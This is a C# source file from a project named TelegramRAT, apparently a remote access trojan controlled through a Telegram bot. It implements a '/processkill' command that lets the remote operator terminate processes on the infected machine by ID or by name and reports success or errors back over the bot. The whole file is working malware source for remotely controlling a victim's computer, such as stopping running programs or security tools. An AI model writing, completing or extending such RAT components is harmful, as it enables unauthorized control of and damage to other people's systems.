using Telegram.Bot;
using System.Diagnostics;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.System;

public class ProcessKillCommand(IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "processkill";
    public override string Description => "Kill process or processes by name or id.";
    public override string Example => "/processkill id:1234";
    public override int ArgsCount => -2;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            if (model.Args[0].StartsWith("id:", StringComparison.OrdinalIgnoreCase))
            {
                string procStr = model.Args[0][3..].Trim();
                if (!string.IsNullOrEmpty(procStr) && int.TryParse(procStr, out int procId))
                {
                    using (var proc = Process.GetProcessById(procId))
                    {
                        proc.Kill();
                    }
                    await notificationService.SendSuccessAsync(model.Message, "Process killed successfully.");
                }
                else
                {
                    await notificationService.SendErrorAsync(model.Message, new ArgumentException("Invalid process ID."));
                }
                return;
            }

            if (model.Args[0].StartsWith("name:", StringComparison.OrdinalIgnoreCase))
            {
                string procStr = model.Args[0][5..].Trim();
                var processes = Process.GetProcessesByName(procStr);
                if (processes.Length == 0)
                {
                    await notificationService.SendErrorAsync(model.Message, new ArgumentException("No running processes with that name."));
                    return;
                }
                foreach (var proc in processes)
                {
                    using (proc)
                    {
                        proc.Kill();
                    }
                }
                await notificationService.SendSuccessAsync(model.Message, "Processes killed successfully.");
                return;
            }

            var defaultProcesses = Process.GetProcessesByName(model.RawArgs);
            if (defaultProcesses.Length == 0)
            {
                await notificationService.SendErrorAsync(model.Message, new ArgumentException("No running processes with that name."));
                return;
            }
            foreach (var proc in defaultProcesses)
            {
                using (proc)
                {
                    proc.Kill();
                }
            }
            await notificationService.SendSuccessAsync(model.Message, "Processes killed successfully.");
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
